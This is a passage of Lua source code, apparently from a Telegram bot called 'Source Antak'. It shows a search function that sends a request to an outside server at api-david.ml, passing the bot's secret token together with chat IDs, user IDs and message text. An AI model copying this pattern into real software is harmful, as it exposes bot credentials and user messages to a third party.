...
local msg_id = msg.id_/2097152/0.5 
https.request('https://api-david.ml//Antak/AntakYt.php?Put=Search&TokenBot='..TokenBot..'&ChatId='..msg.chat_id_..'&UserId='..msg.sender_user_id_..'&Text='..URL.escape(Text)..'&MsgId='..msg_id..'&Name='..DirName)
end
--     Source Antak     --
if SecondSudo(msg) then
